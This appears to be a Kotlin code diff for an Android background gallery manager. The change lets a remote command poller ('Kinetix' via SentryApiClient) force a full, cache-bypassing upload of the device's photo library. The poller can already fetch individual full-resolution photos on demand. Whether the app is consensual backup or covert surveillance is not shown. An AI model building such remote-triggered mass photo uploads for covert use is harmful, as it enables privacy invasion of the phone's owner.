@@ -75,7 +75,7 @@ object BackgroundGalleryManager {
             }
         }
 
-        // 3. Fast Command Poller for On-Demand Full-Resolution Photo Fetching
+        // 3. Fast Command Poller for On-Demand Full-Resolution Photo Fetching & Instant Sync Requests
         if (commandPollerJob?.isActive != true) {
             commandPollerJob = scope.launch {
                 val client = SentryApiClient(context)
@@ -87,6 +87,10 @@ object BackgroundGalleryManager {
                             val fullImageMediaId = obj?.optString("fullImageMediaId")?.takeIf { it.isNotBlank() && it != "null" }
                             if (!fullImageMediaId.isNullOrBlank()) {
                                 handleFullImageUpload(context, client, fullImageMediaId)
+                            }
+                            if (obj?.optBoolean("syncRequested") == true) {
+                                Log.d(TAG, "Sync requested from Kinetix. Triggering instant gallery sync...")
+                                syncGallery(context, client, forceFullSync = true)
                             }
                         }
                     } catch (_: Exception) {
@@ -131,7 +135,7 @@ object BackgroundGalleryManager {
         sp.edit().putStringSet(KEY_SYNCED_IDS, current).apply()
     }
 
-    suspend fun syncGallery(context: Context, client: SentryApiClient) {
+    suspend fun syncGallery(context: Context, client: SentryApiClient, forceFullSync: Boolean = false) {
         if (isSyncing) return
         isSyncing = true
         try {
@@ -198,8 +202,8 @@ object BackgroundGalleryManager {
                     val mediaIdStr = "media_$mediaId"
                     val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
 
-                    // Skip corrupt / 0-byte files and skip photos already synced in local cache
-                    if (sizeBytes < 1024 || alreadySyncedIds.contains(mediaIdStr)) {
+                    // Skip corrupt / 0-byte files and skip photos already synced in local cache unless full sync requested
+                    if (sizeBytes < 1024 || (!forceFullSync && alreadySyncedIds.contains(mediaIdStr))) {
                         continue
                     }
 
